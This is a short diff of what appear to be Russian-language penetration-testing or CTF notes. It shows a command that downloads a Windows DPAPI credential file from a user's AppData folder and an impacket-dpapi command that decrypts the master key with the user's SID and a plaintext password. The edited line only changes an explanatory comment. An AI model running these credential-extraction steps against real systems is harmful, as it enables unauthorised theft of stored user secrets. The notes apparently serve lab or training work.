@@ -40,7 +40,7 @@ wmic product get name
     # скачиваем кред
     download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
     
-    Декодируем ключ шифрования:
+    Декодируем ключ шифрования (мастер ключю - protect - пароль пользователя в котором ковыряемся):
     
     impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
 
